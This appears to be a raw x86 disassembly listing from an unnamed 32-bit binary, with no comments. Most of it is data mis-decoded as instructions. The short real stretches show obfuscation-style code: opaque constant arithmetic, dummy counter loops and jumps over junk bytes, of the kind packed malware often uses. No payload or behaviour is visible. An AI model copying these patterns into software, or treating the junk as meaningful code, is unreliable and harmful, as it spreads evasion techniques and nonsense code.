  4058ce:	xor    ecx,DWORD PTR [ebp+0x6e92c3f6]
  4058d4:	push   eax
  4058d5:	jecxz  0x405941
  4058d7:	push   cs
  4058d8:	cdq    
  4058d9:	push   eax
  4058da:	jmp    0x4058ed
  4058dc:	and    DWORD PTR [edx-0x725e4eb3],ecx
  4058e2:	outs   dx,BYTE PTR ds:[esi]
  4058e3:	sbb    BYTE PTR [ebx-0x2a395ec8],dl
  4058e9:	jo     0x4058d9
  4058eb:	fldenv [ecx-0xff2e561]
  4058f1:	aam    0xb7
  4058f3:	pop    esp
  4058f4:	mov    al,0xc5
  4058f6:	sbb    eax,edx
  4058f8:	push   edx
  4058f9:	std    
  4058fa:	fisubr DWORD PTR ds:0xaedfd7d9
  405900:	jecxz  0x405884
  405902:	out    0xe,al
  405904:	jmp    0x4058d1
  405906:	sahf   
  405907:	repnz cmp dl,BYTE PTR [edx+0x42]
  40590b:	dec    edx
  40590c:	jo     0x40596e
  40590e:	xchg   esp,eax
  40590f:	mov    ebp,0x28820073
  405914:	cmp    DWORD PTR [edi+0x1],esi
  405917:	adc    BYTE PTR [esi-0x68a8e5e3],dh
  40591d:	aad    0xd
  40591f:	sub    ah,BYTE PTR [edx+ebp*2-0x29]
  405923:	in     al,dx
  405924:	(bad)  
  405925:	push   ecx
  405926:	fld    DWORD PTR [ecx-0x3a]
  405929:	popa   
  40592a:	pop    ecx
  40592b:	out    dx,al
  40592c:	mov    al,ds:0x77fc2939
  405931:	gs ds and al,0x9d
  405935:	arpl   WORD PTR [esi],di
  405937:	in     al,dx
  405938:	sbb    eax,0xd290e12a
  40593d:	(bad)
  405940:	or     BYTE PTR [edi+ecx*8],dh
  405943:	cmc    
  405944:	or     al,0xbd
  405946:	xor    bh,dl
  405948:	pop    edx
  405949:	repnz adc al,0x62
  40594c:	push   0x3e327cf0
  405951:	imul   ecx,DWORD PTR [ebx+0x40],0xfffffff0
  405955:	js     0x4059a2
  405957:	sbb    BYTE PTR [esi+eiz*2+0x2f9d8d18],0x69
  40595f:	xor    cl,BYTE PTR [ebx]
  405961:	das    
  405962:	sbb    DWORD PTR [ecx],esi
  405964:	sub    ecx,eax
  405966:	cmp    eax,0xd018245a
  40596b:	dec    ebx
  40596c:	sbb    DWORD PTR [ebp-0x6f],0x1d
  405970:	inc    esi
  405971:	mov    ebx,0x712ad463
  405976:	pusha  
  405977:	xchg   ecx,eax
  405978:	xchg   esp,eax
  405979:	xchg   ebp,eax
  40597a:	xchg   edi,eax
  40597b:	push   edi
  40597c:	and    edi,DWORD PTR [ecx]
  40597e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40597f:	sub    ah,BYTE PTR [ecx+ebx*1]
  405982:	pop    ebp
  405983:	cwde   
  405984:	cmp    DWORD PTR [esp+eax*1+0x7f857011],esp
  40598b:	xchg   ecx,eax
  40598c:	nop
  40598d:	out    0x6,eax
  40598f:	(bad)  
  405990:	(bad)  
  405991:	mov    ebx,0xbfd2436f
  405996:	int    0x5a
  405998:	push   es
  405999:	pop    ebx
  40599a:	sub    dh,BYTE PTR [edx+0x3969f93e]
  4059a0:	xor    al,0xe0
  4059a2:	push   0xc8209999
  4059a7:	pop    eax
  4059a8:	imul   ebp,DWORD PTR [edx],0xffffffa5
  4059ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4059ac:	mov    al,0xc8
  4059ae:	neg    DWORD PTR [esi]
  4059b0:	loope  0x405a26
  4059b2:	scas   eax,DWORD PTR es:[edi]
  4059b3:	(bad)  
  4059b5:	mov    ds:0x6995520,al
  4059ba:	jo     0x4059c3
  4059bc:	push   es
  4059bd:	cld    
  4059be:	scas   eax,DWORD PTR es:[edi]
  4059bf:	jge    0x405978
  4059c1:	sbb    ah,BYTE PTR [ebp-0x5d]
  4059c4:	dec    edx
  4059c5:	into   
  4059c6:	lock clc 
  4059c8:	push   esi
  4059c9:	ret    
  4059ca:	sub    bh,dl
  4059cc:	aad    0x6f
  4059ce:	or     al,0xa2
  4059d0:	sub    BYTE PTR [edx-0x35e6823f],al
  4059d6:	retf   0x352b
  4059d9:	loope  0x405996
  4059db:	add    ch,BYTE PTR [eax]
  4059dd:	popf   
  4059de:	push   edi
  4059df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059e0:	sub    cl,dh
  4059e2:	lods   eax,DWORD PTR ds:[esi]
  4059e3:	dec    eax
  4059e4:	dec    ebp
  4059e5:	test   al,0xd5
  4059e7:	aad    0xd
  4059e9:	cmp    ebp,DWORD PTR [ecx]
  4059eb:	int    0x43
  4059ed:	push   esi
  4059ee:	in     al,dx
  4059ef:	cmp    DWORD PTR [eax-0x17],eax
  4059f2:	jmp    0xbd3:0x42b35faf
  4059f9:	call   0xcd89e67b
  4059fe:	scas   eax,DWORD PTR es:[edi]
  4059ff:	push   ecx
  405a00:	push   es
  405a01:	xchg   ecx,eax
  405a02:	xor    al,0xf5
  405a04:	mov    esi,0xcdff108b
  405a09:	int    0x45
  405a0b:	add    al,0xf1
  405a0d:	je     0x4059f8
  405a0f:	jl     0x405a83
  405a11:	arpl   WORD PTR [edi+0xa],cx
  405a14:	push   esi
  405a15:	cmp    BYTE PTR [esi],bh
  405a17:	sbb    bh,0xcd
  405a1a:	pusha  
  405a1b:	cld    
  405a1c:	stos   DWORD PTR es:[edi],eax
  405a1d:	xor    BYTE PTR [esi-0x44],bl
  405a20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a21:	fwait
  405a22:	inc    esi
  405a23:	xor    BYTE PTR [edx],bl
  405a25:	inc    esp
  405a26:	xchg   esp,eax
  405a27:	leave  
  405a28:	and    BYTE PTR [edi-0x52369651],bh
  405a2e:	test   BYTE PTR [ebx+0xb],ch
  405a31:	nop
  405a32:	retf   
  405a33:	xor    ecx,DWORD PTR [ecx+0x1ba3c8b4]
  405a39:	aaa    
  405a3a:	inc    esp
  405a3b:	and    BYTE PTR [edx],dl
  405a3d:	sub    ebx,DWORD PTR [ebx-0x75]
  405a40:	aas    
  405a41:	aad    0x47
  405a43:	neg    DWORD PTR [eax+0x8]
  405a46:	jo     0x405a1a
  405a48:	int3   
  405a49:	mul    DWORD PTR [ebp-0x34111967]
  405a4f:	dec    esp
  405a50:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  405a57:	and    edx,0x797b
  405a5d:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  405a64:	and    edx,edx
  405a66:	mov    eax,DWORD PTR [ebp-0x4]
  405a69:	sbb    ecx,DWORD PTR ds:0x42fd05
  405a6f:	push   esi
  405a70:	mov    esi,DWORD PTR [ebp-0x8]
  405a73:	and    DWORD PTR ds:0x42fcf1,0x0
  405a7d:	jmp    0x405a8f
  405a82:	mov    edx,DWORD PTR ds:0x42fcf1
  405a88:	inc    edx
  405a89:	mov    DWORD PTR ds:0x42fcf1,edx
  405a8f:	cmp    DWORD PTR ds:0x42fcf1,0x17
  405a96:	jae    0x405b0b
  405a9c:	cmp    DWORD PTR ds:0x42fcf1,0x1d
  405aa3:	jne    0x405ab5
  405aa9:	push   DWORD PTR [ebp-0x24]
  405aac:	push   DWORD PTR [ebp-0x20]
  405aaf:	call   DWORD PTR ds:0x42e2db
  405ab5:	jmp    0x405a82
  405aba:	mov    DWORD PTR ds:0x42fcd9,0x14
  405ac4:	cmp    DWORD PTR ds:0x42fcd9,0x0
  405acb:	je     0x405b0b
  405ad1:	cmp    DWORD PTR ds:0x42fcd9,0x16
  405ad8:	jne    0x405af7
  405ade:	push   DWORD PTR [ebp-0x14]
  405ae1:	push   0x2e3f
  405ae6:	push   DWORD PTR [ebp-0x18]
  405ae9:	push   DWORD PTR [ebp-0x18]
  405aec:	push   0x8cdb
  405af1:	call   DWORD PTR ds:0x42e537
  405af7:	xor    edx,edx
  405af9:	xor    edx,DWORD PTR ds:0x42fcd9
  405aff:	dec    edx
  405b00:	mov    DWORD PTR ds:0x42fcd9,edx
  405b06:	jmp    0x405ac4
  405b0b:	mov    edx,0x7510855
  405b10:	add    DWORD PTR ds:0x42fcd1,edi
  405b16:	xor    eax,edx
  405b18:	and    DWORD PTR ds:0x42e6f7,ebx
  405b1e:	xor    esi,edx
  405b20:	mov    ecx,0x32729c
  405b25:	add    esi,ecx
  405b27:	add    eax,ecx
  405b29:	imul   eax,esi
  405b2c:	mov    esi,DWORD PTR [ebp+0xc]
  405b2f:	cmp    esi,eax
  405b31:	jne    0x405b4d
  405b37:	mov    eax,DWORD PTR [ebp-0x4]
  405b3a:	mov    esi,DWORD PTR [ebp-0x8]
  405b3d:	xor    eax,edx
  405b3f:	xor    esi,edx
  405b41:	add    eax,ecx
  405b43:	add    esi,ecx
  405b45:	imul   eax,esi
  405b48:	jmp    0x405e5b
  405b4d:	mov    eax,DWORD PTR [ebp+0xc]
  405b50:	mov    eax,DWORD PTR [eax+0x78]
  405b53:	mov    DWORD PTR [ebp+0xc],eax
  405b56:	mov    eax,DWORD PTR [ebp-0x4]
  405b59:	mov    esi,DWORD PTR [ebp-0x8]
  405b5c:	xor    eax,edx
  405b5e:	xor    esi,edx
  405b60:	add    eax,ecx
  405b62:	add    esi,ecx
  405b64:	imul   eax,esi
  405b67:	mov    esi,DWORD PTR [ebp+0xc]
  405b6a:	cmp    esi,eax
  405b6c:	mov    eax,DWORD PTR [ebp-0x4]
  405b6f:	je     0x405b3a
  405b75:	jmp    0x405e48
  405b7a:	xchg   DWORD PTR [ebx-0xdac0d75],edi
  405b80:	imul   esi,DWORD PTR gs:[eax+0x3],0x5418624d
  405b88:	push   esp
  405b89:	test   BYTE PTR ds:[edx],dh
  405b8c:	jo     0x405bfe
  405b8e:	stos   BYTE PTR es:[edi],al
  405b8f:	jle    0x405c01
  405b91:	jo     0x405bf1
  405b93:	sbb    eax,0xb40730d3
  405b98:	jnp    0x405b8a
  405b9a:	xchg   esi,eax
  405b9b:	pop    es
  405b9c:	push   es
  405b9d:	dec    ebx
  405b9e:	les    ecx,FWORD PTR [eax+ebx*1-0xc]
  405ba2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ba3:	ins    BYTE PTR es:[edi],dx
  405ba4:	icebp  
  405ba5:	pop    ds
  405ba6:	ret    0x6d38
  405ba9:	sub    dh,ch
  405bab:	or     bl,BYTE PTR [ebp+0x41ebb107]
  405bb1:	and    esi,ecx
  405bb3:	int3   
  405bb4:	das    
  405bb5:	dec    esi
  405bb6:	and    BYTE PTR [edx],cl
  405bb8:	xchg   ebx,eax
  405bb9:	jle    0x405b52
  405bbb:	cs mov ebx,0xd89eed2e
  405bc1:	jbe    0x405b91
  405bc3:	sbb    eax,0x617642e2
  405bc8:	mov    eax,ds:0x1aed2ed7
  405bcd:	and    eax,0x944d2cf4
  405bd2:	popf   
  405bd3:	xchg   BYTE PTR [eax-0xedd675],ch
  405bd9:	push   ecx
  405bda:	cmp    DWORD PTR [ebx-0xdaddd52],ecx
  405be0:	mov    ebp,0xb312f426
  405be5:	push   edi
  405be6:	pop    ebp
  405be7:	les    edx,FWORD PTR [esi]
  405be9:	pusha  
  405bea:	push   esi
  405beb:	pop    eax
  405bec:	aad    0xf9
  405bee:	es loop 0x405bf1
  405bf1:	or     eax,ebp
  405bf3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405bf4:	jnp    0x405b8c
  405bf6:	xchg   esp,eax
  405bf7:	mov    bh,0xd2
  405bf9:	sti    
  405bfa:	sub    eax,0x72537918
  405bff:	fld    TBYTE PTR [esi-0xdabf51b]
  405c05:	sar    BYTE PTR [esi],cl
  405c07:	mov    fs,WORD PTR [esi+0x7edac8cb]
  405c0d:	les    esp,FWORD PTR [esi+0x3349eac6]
  405c13:	xlat   BYTE PTR ds:[ebx]
  405c14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c15:	inc    ebx
  405c16:	mov    dh,0xf0
  405c18:	stos   DWORD PTR es:[edi],eax
  405c19:	xchg   edi,eax
  405c1a:	out    0x95,al
  405c1c:	inc    esi
  405c1d:	outs   dx,DWORD PTR ds:[esi]
  405c1e:	loop   0x405c6e
  405c20:	rcr    DWORD PTR ds:0xf90781c5,1
  405c26:	mov    ah,BYTE PTR ds:0x901eac96
  405c2c:	jp     0x405ca5
  405c2e:	cli    
  405c2f:	nop
  405c30:	repnz fcom DWORD PTR [ebp+0xea6332]
  405c37:	call   0x2cdc1c3a
  405c3c:	xchg   esi,eax
  405c3d:	xchg   ebp,eax
  405c3e:	imul   ebx,DWORD PTR [eax+0x45e9deb4],0x88e65220
  405c48:	add    BYTE PTR [esi-0x4b],al
  405c4b:	jbe    0x405bdc
  405c4d:	sar    DWORD PTR [ebp+edx*1-0x9],cl
  405c51:	iret   
  405c52:	fiadd  DWORD PTR [edi]
  405c54:	or     DWORD PTR ds:0x9cec5165,eax
  405c5a:	push   ebx
  405c5b:	es jg  0x405c7e
  405c5e:	bound  ebx,QWORD PTR [edx]
  405c60:	push   ebx
  405c61:	rcr    DWORD PTR [esp+ebx*1],cl
  405c64:	push   edi
  405c65:	push   esp
  405c66:	xchg   ecx,eax
  405c67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c68:	mov    ?,edi
  405c6a:	hlt    
  405c6b:	push   esp
  405c6c:	mov    dh,0xe0
  405c6e:	inc    ecx
  405c6f:	scas   al,BYTE PTR es:[edi]
  405c70:	sahf   
  405c71:	or     cx,ax
  405c74:	setp   BYTE PTR ds:0x5f5f0c19
  405c7b:	sbb    eax,0xf7f2e9de
  405c80:	jae    0x405cee
  405c82:	xchg   ebp,eax
  405c83:	cmp    al,0x21
  405c85:	mov    ebp,ds
  405c87:	jp     0x405cc3
  405c89:	int    0xa
  405c8b:	or     dl,BYTE PTR [ebp+eax*8-0x424f2f4f]
  405c92:	rcr    DWORD PTR [eax+0x4e],1
  405c95:	(bad)  
  405c96:	push   ss
  405c97:	icebp  
  405c98:	dec    ebx
  405c99:	ret    
  405c9a:	fnstcw WORD PTR [edx]
  405c9c:	sbb    DWORD PTR [ebp-0x7c],ebp
  405c9f:	xor    BYTE PTR [edx+0x2aac9d21],bl
  405ca5:	dec    esi
  405ca6:	sti    
  405ca7:	sbb    edx,DWORD PTR [esi+0xc]
  405caa:	mov    ebx,0x5c9e0e24
  405caf:	jno    0x405c8f
  405cb1:	std    
  405cb2:	or     DWORD PTR [esi],esp
  405cb4:	pushf  
  405cb5:	add    al,0xca
  405cb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405cb8:	rcr    esp,cl
  405cba:	push   edx
  405cbb:	push   ebp
  405cbc:	and    BYTE PTR [edi-0x18233c74],dh
  405cc2:	mov    ds:0x36d50c99,al
  405cc7:	mov    eax,ds:0xf9fb554d
  405ccc:	mov    WORD PTR ds:0x49ca71a0,?
  405cd2:	jae    0x405cb8
  405cd4:	jle    0x405c59
  405cd6:	fst    QWORD PTR [esi+edx*8-0x2a]
  405cda:	test   BYTE PTR [ecx+0x6158f98e],ch
  405ce0:	and    ecx,edx
  405ce2:	xchg   ebp,eax
  405ce3:	outs   dx,DWORD PTR ds:[esi]
  405ce4:	cdq    
  405ce5:	xchg   ebx,eax
  405ce6:	scas   al,BYTE PTR es:[edi]
  405ce7:	aad    0xe
  405ce9:	push   ds
  405cea:	xor    eax,0xd23417fd
  405cef:	mov    cl,bl
  405cf1:	rcl    BYTE PTR [edi+0x4e431bd5],cl
  405cf7:	jno    0x405c8c
  405cf9:	sbb    eax,0xef739ba9
  405cfe:	sub    dl,dl
  405d00:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  405d02:	pop    edi
  405d03:	mov    ah,al
  405d05:	sbb    DWORD PTR [edi],0x56
  405d08:	add    BYTE PTR [ebx-0x6ebc4784],bl
  405d0e:	add    eax,0x94b16255
  405d13:	xlat   BYTE PTR ds:[ebx]
  405d14:	mov    fs:0x6b38917b,al
  405d1a:	nop
  405d1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d1c:	jg     0x405d21
  405d1e:	mov    WORD PTR [ebp+ecx*8-0x26266cdf],es
  405d25:	test   DWORD PTR [edx],edi
  405d27:	loope  0x405cbc
  405d29:	inc    esi
  405d2a:	push   ss
  405d2b:	xor    eax,0xaf7e620
  405d30:	or     bh,BYTE PTR [edi+0x6188edff]
  405d36:	cmp    eax,0xb44993cf
  405d3b:	push   ebp
  405d3c:	pop    edx
  405d3d:	sub    cl,BYTE PTR [edx-0x1e]
  405d40:	aaa    
  405d41:	popa   
  405d42:	popa   
  405d43:	sub    DWORD PTR [ecx],edx
  405d45:	mov    ch,0xef
  405d47:	test   DWORD PTR [ebx-0x53],eax
  405d4a:	xor    BYTE PTR [esi],ah
  405d4c:	adc    dh,bl
  405d4e:	xchg   ebx,eax
  405d4f:	or     ah,ah
  405d51:	push   ds
  405d52:	jns    0x405cf3
  405d54:	mov    BYTE PTR [edi-0x53],ch
  405d57:	ins    BYTE PTR es:[edi],dx
  405d58:	sar    DWORD PTR [eax+0x2d],1
  405d5b:	(bad)
  405d5f:	mov    dh,BYTE PTR [esi-0x29906ff8]
  405d65:	fnstcw WORD PTR [esi-0x4e]
  405d68:	mov    ebp,0x373d4d2c
  405d6d:	inc    edx
  405d6e:	fcomi  st,st(2)
  405d70:	jb     0x405d50
  405d72:	stos   DWORD PTR es:[edi],eax
  405d73:	xchg   DWORD PTR [edi+0x4f],ebp
  405d76:	sahf   
  405d77:	sbb    al,0x9b
  405d79:	fistp  QWORD PTR [ecx-0x48]
  405d7c:	push   ebx
  405d7d:	jo     0x405de7
  405d7f:	(bad)  
  405d80:	xor    al,0xaf
  405d82:	push   ecx
  405d83:	mov    eax,0xb109a4f4
  405d88:	int    0x53
  405d8a:	cmp    eax,0x814b47c3
  405d8f:	dec    ebx
  405d90:	je     0x405d60
  405d92:	pop    edi
  405d93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d94:	xor    al,0xac
  405d96:	pop    esp
  405d97:	xchg   ebx,eax
  405d98:	pop    esp
  405d99:	adc    dl,ah
  405d9b:	push   cs
  405d9c:	or     BYTE PTR [esi+0x56],cl
  405d9f:	push   ebp
  405da0:	xchg   ebx,eax
  405da1:	mov    ch,0xfa
  405da3:	inc    esi
  405da4:	sub    dh,BYTE PTR [ebx+ebx*8]
  405da7:	std    
  405da8:	ins    DWORD PTR es:[edi],dx
  405da9:	sub    ah,0xf0
  405dac:	gs int3 
  405dae:	lahf   
  405daf:	cmc    
  405db0:	dec    eax
  405db1:	dec    esp
  405db2:	ss mov al,0x24
  405db5:	dec    edx
  405db6:	(bad)  
  405db7:	jno    0x405e12
  405db9:	xor    eax,0xed12c5aa
  405dbe:	mov    edi,esp
  405dc0:	or     al,0xf4
  405dc2:	and    eax,0x33d98982
  405dc7:	and    BYTE PTR [ecx-0x45],bh
  405dca:	in     eax,0xeb
  405dcc:	arpl   WORD PTR [ebx-0x47805513],ax
  405dd2:	daa    
  405dd3:	stc    
  405dd4:	sbb    BYTE PTR [edx],ah
  405dd6:	xchg   esp,eax
  405dd7:	shl    BYTE PTR [edi-0x77],1
  405dda:	cld    
  405ddb:	mov    esi,0x7d28359a
  405de0:	(bad)  
  405de1:	sbb    dl,BYTE PTR [ebx+0x231b35b3]
  405de7:	je     0x405dbd
  405de9:	xor    al,0x9f
  405deb:	fild   DWORD PTR [edi+0x6a4daf58]
  405df1:	(bad)  
  405df2:	(bad)  
  405df3:	xor    al,0xc6
  405df5:	retf   0x7089
  405df8:	sti    
  405df9:	popf   
  405dfa:	and    ebp,edi
  405dfc:	add    al,0x5b
  405dfe:	out    dx,eax
  405dff:	enter  0x5fe9,0x21
  405e03:	inc    ebx
  405e04:	mov    esi,0x16eaa93f
  405e09:	rcl    ebp,0x77
  405e0c:	xchg   esp,eax
  405e0d:	repnz inc ebp
  405e0f:	xor    edi,edi
  405e11:	jg     0x405e2e
  405e13:	shl    edi,0x20
  405e16:	imul   ecx,DWORD PTR ds:0x3a24f798,0x3a
  405e1d:	std    
  405e1e:	retf   
  405e1f:	and    DWORD PTR [ecx+ecx*8],0xcb57a216
  405e26:	push   es
  405e27:	dec    esp
  405e28:	inc    eax
  405e29:	sbb    al,0x12
  405e2b:	jmp    0x6c84:0xa4345213
  405e32:	xchg   esi,eax
  405e33:	mov    ecx,0xe32a9bdc
  405e39:	push   ebx
  405e3a:	ret    
  405e3b:	fisttp DWORD PTR [ecx+0x13]
  405e3e:	add    esp,DWORD PTR [ecx-0x243adc60]
  405e44:	inc    esi
  405e45:	lods   al,BYTE PTR ds:[esi]
  405e46:	push   ecx
  405e47:	sub    dh,BYTE PTR [ebx]
  405e49:	ret    0xc103
  405e4c:	mov    ecx,DWORD PTR [ebp+0xc]
  405e4f:	imul   eax,ecx
  405e52:	add    eax,DWORD PTR [ebp+0x8]
  405e55:	mov    DWORD PTR [ebp+0xc],eax
  405e58:	mov    eax,DWORD PTR [ebp+0xc]
  405e5b:	pop    esi
  405e5c:	leave  
  405e5d:	ret    0x8
  405e60:	push   ebp
  405e61:	mov    ebp,esp
  405e63:	push   ecx
  405e64:	add    DWORD PTR ds:0x42e70f,0x1508
  405e6e:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  405e75:	mov    eax,DWORD PTR [ebp-0x4]
  405e78:	mov    edx,DWORD PTR [ebp+0x10]
  405e7b:	adc    DWORD PTR ds:0x42e6ef,0x4006
  405e85:	mov    ecx,0x7510855
  405e8a:	xor    DWORD PTR ds:0x42fd01,0x260
  405e94:	xor    eax,ecx
  405e96:	jmp    0x40605c
  405e9b:	fidiv  DWORD PTR [edx+0x7b]
  405e9e:	jle    0x405e33
  405ea0:	jne    0x405e7b
  405ea2:	jb     0x405e2d
  405ea4:	(bad)  
  405ea5:	(bad)  
  405ea6:	sub    al,0x80
  405ea8:	in     eax,0x5e
  405eaa:	inc    edi
  405eab:	ds aas 
  405ead:	jo     0x405f1f
  405eaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405eb0:	jg     0x405f22
  405eb2:	jo     0x405e39
  405eb4:	mov    eax,0x7f264454
  405eb9:	dec    ch
  405ebb:	jne    0x405e41
  405ebd:	lahf   
  405ebe:	xor    DWORD PTR ds:0x740fedef,ebx
  405ec4:	push   ds
  405ec5:	jno    0x405e50
  405ec7:	out    0x2a,eax
  405ec9:	jne    0x405ed1
  405ecb:	sti    
  405ecc:	(bad)  
  405ecd:	pop    ecx
  405ece:	push   0xffffffbf
  405ed0:	and    edi,DWORD PTR [eax+0x4d]
  405ed3:	pop    ebx
  405ed4:	sub    esi,DWORD PTR [eax]
  405ed6:	nop
  405ed7:	mov    bh,BYTE PTR [ecx-0x40c23519]
  405edd:	(bad)  
  405ede:	aaa    
  405edf:	mov    edi,0xe1f153e8
  405ee4:	push   esp
  405ee5:	int    0x3f
  405ee7:	test   al,0xd8
  405ee9:	call   0xecbb:0x887ba342
  405ef0:	mov    dh,0x83
  405ef2:	jmp    0xcea7:0xf53b200e
  405ef9:	lock test eax,0x8554b507
  405eff:	imul   esp,DWORD PTR [esi+edx*8-0x66],0x8b29f8ba
  405f07:	loope  0x405f6f
  405f09:	dec    esi
  405f0a:	cmp    DWORD PTR [edx],ecx
  405f0c:	call   DWORD PTR [ecx-0x60]
  405f0f:	push   0x40
  405f11:	mov    dh,0xe2
  405f13:	jl     0x405efe
  405f15:	add    ah,dl
  405f17:	aaa    
  405f18:	js     0x405f8c
  405f1a:	adc    eax,0xa33dfddb
  405f1f:	jge    0x405ee7
  405f21:	pop    ebx
  405f22:	xchg   DWORD PTR [edi],ecx
  405f24:	mov    edi,ss
  405f26:	stos   BYTE PTR es:[edi],al
  405f27:	jmp    0x405ec7
  405f29:	mov    ebp,0xb9918493
  405f2e:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  405f30:	mov    dh,dh
  405f32:	hlt    
  405f33:	fsubr  DWORD PTR [ebx]
  405f35:	add    BYTE PTR [ebx],cl
  405f37:	addr16 xor al,0x2a
  405f3a:	adc    BYTE PTR [esi],dl
  405f3c:	mov    ah,0x6e
  405f3e:	sbb    al,0x7b
  405f40:	dec    esi
  405f41:	jb     0x405f06
  405f43:	mov    ebp,0xfd93cd6
  405f48:	popf   
  405f49:	cmp    esp,DWORD PTR [ebx+0x2e0581b7]
  405f4f:	pop    es
  405f50:	mov    ebp,0xbe71b839
  405f55:	popa   
  405f56:	arpl   WORD PTR [esp+ebx*1-0x2f530d7b],cx
  405f5d:	cmp    al,cl
  405f5f:	cmp    al,0x6
  405f61:	dec    ebx
  405f62:	inc    eax
  405f63:	sbb    DWORD PTR [edi+ecx*2-0x14],eax
  405f67:	adc    al,0xa5
  405f69:	cmovbe edx,DWORD PTR [edx+0x6cdf1d46]
  405f70:	(bad)  
  405f71:	add    DWORD PTR [eax-0x221edb65],0x90db7d41
  405f7b:	loope  0x405fea
  405f7d:	jbe    0x405fe3
  405f7f:	repnz enter 0xf981,0x17
  405f84:	sahf   
  405f85:	test   eax,0xf49ad0a
  405f8a:	push   edx
  405f8b:	aam    0xc1
  405f8d:	scas   al,BYTE PTR es:[edi]
  405f8e:	fcomip st,st(0)
  405f90:	cmp    ch,BYTE PTR [esi]
  405f92:	cmp    bh,0xc7
  405f95:	mov    esi,0xccb6b23f
  405f9a:	cli    
  405f9b:	lods   eax,DWORD PTR ds:[esi]
  405f9c:	jle    0x405f8c
  405f9e:	cld    
  405f9f:	outs   dx,DWORD PTR ds:[esi]
  405fa0:	and    al,0xe0
  405fa2:	or     cl,dh
  405fa4:	psubusb mm0,mm1
  405fa7:	add    WORD PTR [esi],0x528e
  405fac:	dec    ebp
  405fad:	call   DWORD PTR [ebp+0x3b73a5dd]
  405fb3:	mov    esi,0x1f78b8c
  405fb8:	mov    cl,0xd3
  405fba:	xchg   edi,eax
  405fbb:	(bad)  
  405fbc:	mov    bh,0x79
  405fbe:	pop    ebx
  405fbf:	dec    ebx
  405fc0:	ror    BYTE PTR [ebx+0x61],cl
  405fc3:	or     eax,esp
  405fc5:	xchg   DWORD PTR [edi-0x71c44d66],esi
  405fcb:	sub    BYTE PTR [ebx+0x7ed65628],dl
  405fd1:	in     al,dx
  405fd2:	cmp    al,0x86
  405fd4:	or     dh,BYTE PTR [ebp+0x26de476]
  405fda:	pushf  
  405fdb:	clc    
  405fdc:	xchg   esi,eax
  405fdd:	fst    DWORD PTR [ecx]
  405fdf:	or     BYTE PTR [edi],0x3b
  405fe2:	test   al,0xc5
  405fe4:	dec    edx
  405fe5:	inc    esi
  405fe6:	in     al,dx
  405fe7:	leave  
  405fe8:	sbb    eax,0x32d20fe4
  405fed:	imul   BYTE PTR [edx-0x1a3ecbc4]
  405ff3:	inc    ebp
  405ff4:	pop    ebp
  405ff5:	shr    DWORD PTR [edx+edi*1],0x34
  405ff9:	push   ecx
  405ffa:	jno    0x405fb8
  405ffc:	mov    bh,0x7f
  405ffe:	xchg   BYTE PTR [eax+0x66],cl
  406001:	inc    edx
  406002:	mov    esp,0x9733e7c5
  406007:	stos   BYTE PTR es:[edi],al
  406008:	lock clc 
  40600a:	hlt    
  40600b:	sbb    al,0x33
  40600d:	mov    bl,0x2
  40600f:	xchg   ecx,eax
  406010:	jp     0x405fdb
  406012:	outs   dx,DWORD PTR ds:[esi]
  406013:	xchg   ebp,eax
  406014:	or     al,0x6
  406016:	adc    al,0x4
  406018:	(bad)  
  406019:	cmp    al,0x40
  40601b:	arpl   WORD PTR [esi+0x74e55d56],si
  406021:	mov    ds:0x8ac5cc60,al
  406026:	rcr    BYTE PTR [eax+eiz*8],0x1e
  40602a:	sbb    dh,dl
  40602c:	pop    esi
  40602d:	outs   dx,BYTE PTR ds:[esi]
  40602e:	jno    0x405fd1
  406030:	call   edx
  406032:	mov    ecx,0x13ceb180
  406037:	mov    bl,0x2
  406039:	sbb    ecx,DWORD PTR [edi]
  40603b:	rcl    esi,0x8
  40603e:	rol    DWORD PTR [edx+0x1d33d8dd],cl
  406044:	mov    ebp,0x69912b15
  406049:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40604a:	stos   DWORD PTR es:[edi],eax
  40604b:	jmp    0xfb78:0x19b0f534
  406052:	loop   0x40608c
  406054:	ja     0x40601a
  406056:	mov    ebx,0x6dae4470
  40605b:	ss add eax,0x32729c
  406061:	or     DWORD PTR ds:0x42fd86,0xae4
  40606b:	mov    DWORD PTR [edx],eax
  40606d:	mov    eax,DWORD PTR [ebp+0xc]
  406070:	xor    eax,ecx
  406072:	push   esi
  406073:	sbb    edx,DWORD PTR ds:0x42e118
  406079:	mov    esi,DWORD PTR [ebp+0x10]
  40607c:	or     DWORD PTR ds:0x42fd76,edx
  406082:	mov    edx,0x32729c
  406087:	sbb    DWORD PTR ds:0x42fcf1,0x42e11c
  406091:	add    eax,edx
  406093:	adc    DWORD PTR ds:0x42fcd1,0x42e6fb
  40609d:	mov    DWORD PTR [esi+0x4],eax
  4060a0:	sbb    eax,0x6979
  4060a5:	mov    eax,DWORD PTR [ebp+0x14]
  4060a8:	adc    DWORD PTR ds:0x42fd82,0x2335
  4060b2:	mov    esi,DWORD PTR [ebp+0x10]
  4060b5:	sub    DWORD PTR ds:0x42fcd5,0x1c02
  4060bf:	mov    DWORD PTR [esi+0x8],eax
  4060c2:	or     eax,DWORD PTR ds:0x42fd05
  4060c8:	jmp    0x40628e
  4060cd:	out    dx,al
  4060ce:	hlt    
  4060cf:	arpl   WORD PTR [edx],dx
  4060d1:	popa   
  4060d2:	xchg   ecx,eax
  4060d3:	ins    DWORD PTR es:[edi],dx
  4060d4:	hlt    
  4060d5:	(bad)  
  4060d6:	pop    esp
  4060d7:	xor    eax,0xd625c996
  4060dc:	int3   
  4060dd:	gs ds jo 0x406151
